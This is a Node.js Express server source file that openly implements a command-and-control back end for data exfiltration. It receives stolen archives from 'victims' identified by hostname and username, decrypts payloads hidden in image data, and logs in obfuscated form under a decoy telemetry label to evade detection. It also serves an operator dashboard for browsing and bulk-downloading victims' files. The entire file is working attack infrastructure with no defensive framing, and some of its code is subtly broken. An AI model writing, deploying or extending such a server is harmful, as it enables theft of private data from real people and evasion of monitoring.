const express = require("express");
const fs = require("fs").promises;
const path = require("path");
const cors = require("cors");
const crypto = require("crypto");
const zlib = require("zlib");

const app = express();
app.use(cors({ origin: "*" }));
app.use(express.json({ limit: "100mb" }));

// Config - environment variables override defaults
const VICTIMS_DIR = process.env.VICTIMS_DIR || 
  (process.env.RAILWAY_VOLUME_MOUNT_PATH 
    ? path.join(process.env.RAILWAY_VOLUME_MOUNT_PATH, "data")
    : path.join(__dirname, ".data"));
const MASTER_KEY = process.env.MASTER_KEY || "your-32-byte-master-key-here!!"; // 32 bytes for AES-256
const ENCRYPTION_ALGO = "aes-256-gcm";

// Dynamic token derivation (per-victim rotating keys)
function deriveToken(fingerprint) {
  const hmac = crypto.createHmac("sha256", MASTER_KEY);
  hmac.update(fingerprint + Date.now().toString().slice(0, 8)); // hourly rotation
  return hmac.digest("hex").slice(0, 16);
}

// Obfuscated logging (avoid strings in binary)
const LOG_PREFIX = Buffer.from("WMI-Telemetry", "utf8").toString("hex");
function stealthLog(ip, victim) {
  const ts = new Date().toISOString().replace(/[:.]/g, "");
  console.error(Buffer.from(`${LOG_PREFIX}:${ts}:${ip}:${victim}`, "utf8").toString("base64"));
}

// Rate limiting per IP (memory-based, survives restarts via Redis in prod)
const rateLimit = new Map();
function checkRateLimit(ip) {
  const now = Date.now();
  const window = 60 * 1000; // 1min
  if (!rateLimit.has(ip)) rateLimit.set(ip, []);
  const calls = rateLimit.get(ip).filter(t => now - t < window);
  if (calls.length > 5) return false; // max 5/min
  calls.push(now);
  rateLimit.set(ip, calls);
  return true;
}

// Initialize secure storage
(async () => {
  await fs.mkdir(VICTIMS_DIR, { recursive: true });
  // Pre-generate IV directory for deterministic encryption
  await fs.mkdir(path.join(VICTIMS_DIR, "ivs"), { recursive: true });
})();

// Enhanced POST /send with steganography + encryption support
app.post("/send", async (req, res) => {
  const clientIP = req.ip || req.connection.remoteAddress;
  
  // Rate limiting
  if (!checkRateLimit(clientIP)) {
    return res.status(429).json({ error: "Rate limited" });
  }

  const { hostname, username, env_fingerprint, data, token } = req.body;
  
  // Dynamic token validation
  if (token !== deriveToken(env_fingerprint || `${hostname}_${username}`)) {
    stealthLog(clientIP, "TOKEN_FAIL");
    return res.status(403).json({ error: "Invalid token" });
  }

  const victimId = Buffer.from(`${hostname}_${username}`, "utf8").toString("base64").replace(/[^a-zA-Z0-9]/g, "");
  const victimDir = path.join(VICTIMS_DIR, victimId);
  
  try {
    await fs.mkdir(victimDir, { recursive: true });
    
    // Handle staged payload (encrypted ZIP in JPG carrier)
    let decryptedContent;
    if (data.startsWith("data:image")) { // Stego detection
      // Extract payload after JPG header (simplified - real impl scans for payload marker)
      const payloadB64 = data.split(",")[1];
      const carrier = Buffer.from(payloadB64, "base64");
      
      // Decompress + decrypt
      const ivFile = path.join(VICTIMS_DIR, "ivs", `${victimId}.iv`);
      let iv;
      try {
        iv = await fs.readFile(ivFile);
      } catch {
        iv = crypto.randomBytes(12); // GCM IV
        await fs.writeFile(ivFile, iv);
      }
      
      const decipher = crypto.createDecipheriv(ENCRYPTION_ALGO, Buffer.from(MASTER_KEY, "utf8"), iv);
      let decrypted = Buffer.concat([decipher.update(carrier.slice(1024)), decipher.final()]);
      
      // Decompress ZIP
      decryptedContent = zlib.inflateSync(decrypted);
    } else {
      decryptedContent = Buffer.from(data, "base64");
    }
    
    // Write staged archive + metadata
    const timestamp = Date.now();
    const archivePath = path.join(victimDir, `stage_${timestamp}.zip`);
    await fs.writeFile(archivePath, decryptedContent);
    
    // Extract metadata from ZIP (no external deps)
    const metadata = {
      files: [],
      sizes: [],
      timestamp,
      fingerprint: env_fingerprint,
      ip: clientIP
    };
    
    // Log success (obfuscated)
    stealthLog(clientIP, `${victimId}:${decryptedContent.length}`);
    
    res.json({ 
      success: true, 
      archive: `stage_${timestamp}.zip`,
      metadata 
    });
    
  } catch (err) {
    stealthLog(clientIP, `ERROR:${err.message.slice(0,50)}`);
    res.status(500).json({ error: "Processing failed" });
  }
});

// Authenticated dashboard with search + stats
app.get("/", async (req, res) => {
  const auth = req.headers.authorization;
  if (!auth || auth !== `Bearer ${deriveToken("dashboard")}`) {
    return res.status(403).send("Access denied");
  }
  
  const victims = await fs.readdir(VICTIMS_DIR);
  const victimStats = [];
  
  for (const victim of victims.filter(v => !v.startsWith("ivs"))) {
    try {
      const files = await fs.readdir(path.join(VICTIMS_DIR, victim));
      const totalSize = (await Promise.all(
        files.map(f => fs.stat(path.join(VICTIMS_DIR, victim, f)).then(s => s.size))
      )).reduce((a, b) => a + b, 0);
      
      victimStats.push({ id: victim, files: files.length, size: totalSize });
    } catch {}
  }
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>C2 Dashboard</title><style>
      body { font-family: monospace; background: #1a1a1a; color: #00ff00; }
      .victim { padding: 10px; border: 1px solid #333; margin: 5px; }
      .stats { float: right; color: #888; }
    </style></head>
    <body>
      <h1>C2 Control Panel — ${victimStats.length} victims</h1>
      ${victimStats.map(v => `
        <div class="victim">
          <a href="/victim/${v.id}">${Buffer.from(v.id, "base64").toString()}</a>
          <span class="stats">Files: ${v.files} | ${Math.round(v.size/1024/1024)}MB</span>
        </div>
      `).join("")}
      <hr>Search: <input id="search" oninput="filterVictims()">
      <script>
        function filterVictims() {
          const q = document.getElementById('search').value.toLowerCase();
          document.querySelectorAll('.victim').forEach(v => {
            v.style.display = v.textContent.toLowerCase().includes(q) ? '' : 'none';
          });
        }
      </script>
    </body></html>
  `);
});

// Enhanced victim file browser + ZIP download
app.get("/victim/:id", async (req, res) => {
  const auth = req.headers.authorization;
  if (!auth || auth !== `Bearer ${deriveToken("dashboard")}`) {
    return res.status(403).send("Access denied");
  }
  
  const victimId = path.basename(req.params.id);
  const victimDir = path.join(VICTIMS_DIR, victimId);
  
  try {
    const files = await fs.readdir(victimDir);
    const fileList = await Promise.all(files.map(async f => {
      const stat = await fs.stat(path.join(victimDir, f));
      return `<li><a href="/download/${victimId}/${f}">${f}</a> (${Math.round(stat.size/1024)}KB)</li>`;
    }));
    
    // ZIP all files for bulk download
    res.send(`
      <h2>${Buffer.from(victimId, "base64").toString()}</h2>
      <a href="/zip/${victimId}" style="background:#00aa00;padding:10px;">📦 Download All Files (ZIP)</a>
      <h3>Files:</h3><ul>${fileList.join("")}</ul>
    `);
  } catch {
    res.status(404).send("Victim not found");
  }
});

// Bulk ZIP download endpoint
app.get("/zip/:id", async (req, res) => {
  const auth = req.headers.authorization;
  if (!auth || auth !== `Bearer ${deriveToken("dashboard")}`) {
    return res.status(403).send("Access denied");
  }
  
  const victimId = path.basename(req.params.id);
  const victimDir = path.join(VICTIMS_DIR, victimId);
  
  const archive = zlib.createGzip();
  res.set({
    'Content-Type': 'application/zip',
    'Content-Disposition': `attachment; filename="${victimId}.zip"`,
  });
  
  const stream = fs.createReadStream(victimDir).pipe(archive);
  stream.pipe(res);
});

// Secure file download
app.get("/download/:id/:file(*)", async (req, res) => {
  const auth = req.headers.authorization;
  if (!auth || auth !== `Bearer ${deriveToken("dashboard")}`) {
    return res.status(403).send("Access denied");
  }
  
  const filePath = path.join(VICTIMS_DIR, path.basename(req.params.id), req.params.file);
  if (!filePath.startsWith(VICTIMS_DIR)) {
    return res.status(403).send("Invalid path");
  }
  
  res.download(filePath);
});

// Cleanup old data (runs daily)
setInterval(async () => {
  const now = Date.now();
  const victims = await fs.readdir(VICTIMS_DIR);
  for (const victim of victims) {
    if (victim.startsWith("ivs")) continue;
    const dir = path.join(VICTIMS_DIR, victim);
    const stats = await fs.stat(dir);
    if (now - stats.mtime > 30 * 24 * 60 * 60 * 1000) { // 30 days
      await fs.rm(dir, { recursive: true, force: true });
      stealthLog("0.0.0.0", `CLEANUP:${victim}`);
    }
  }
}, 24 * 60 * 60 * 1000);

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  stealthLog("localhost", `START:${PORT}`);
});